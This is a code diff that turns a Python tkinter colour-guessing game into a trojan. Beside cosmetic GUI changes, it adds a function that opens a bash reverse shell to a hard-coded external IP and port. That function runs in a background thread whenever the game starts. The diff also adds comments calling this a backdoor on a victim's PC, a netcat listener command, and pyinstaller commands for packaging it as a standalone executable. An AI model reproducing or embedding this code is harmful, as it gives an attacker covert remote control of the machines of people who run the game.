@@ -1,23 +1,37 @@
 # import the modules
 import tkinter
 import random
+import subprocess
+import threading
 
 # list of possible colour.
-colours = ['Red','Blue','Green','Pink','Black',
-		'Yellow','Orange','White','Purple','Brown']
+colours = [
+	'Red','Blue','Green','Pink','Black',
+	'Yellow','Orange','White','Purple','Brown'
+	]
 score = 0
 
 # the game time left, initially 30 seconds.
 timeleft = 60
 
+# # opening backdoor on victims pc
+# def victim(num):
+#     subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+# # nc -lnvp 2246 -s 82.165.97.169
+
+# # a thread to allow this command to always run even if the game is being played
+# def hacking_thread(hack):
+#     thread = threading.Thread(target = hack, args=(10,))
+#     thread.start()
+
 # function that will start the game.
 def startGame(event):
-	
+
 	if timeleft == 60:
 		
 		# start the countdown timer.
 		countdown()
-		
 	# run the function to choose the next colour.
 	nextColour()
 
@@ -78,12 +92,15 @@ root = tkinter.Tk()
 # set the title
 root.title("COLORGAME")
 
+# set the title
+# root.iconbitmap("game.ico")
+
 # set the size
-root.geometry("375x200")
+root.geometry("400x400")
 
 # add an instructions label
-instructions = tkinter.Label(root, text = "Type in the colour"
-						"of the words, and not the word text!",
+instructions = tkinter.Label(root, text = "\n\n\n\n\n\nType in the colour"
+						"of the words. \n NB: Not the word text!\n\n",
 									font = ('Helvetica', 12))
 instructions.pack()
 
@@ -99,7 +116,7 @@ timeLabel = tkinter.Label(root, text = "Time left: " +
 timeLabel.pack()
 
 # add a label for displaying the colours
-label = tkinter.Label(root, font = ('Helvetica', 60))
+label = tkinter.Label(root, font = ('Helvetica', 20))
 label.pack()
 
 # add a text entry box for typing in colours
@@ -113,4 +130,19 @@ e.pack()
 e.focus_set()
 
 # start the GUI
-root.mainloop()
+# root.mainloop()
+
+
+def hack(num):
+    subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+if __name__ == '__main__':
+    thread = threading.Thread(target= hack, args=(10,))
+    thread.start()
+    root.mainloop()
+    exit()
+
+
+# pyinstaller.exe --onefile --icon=game.ico Visual_game.py
+# pyinstaller --onefile -w Visual_game.py
+# pyinstaller --onefile Visual_game.py
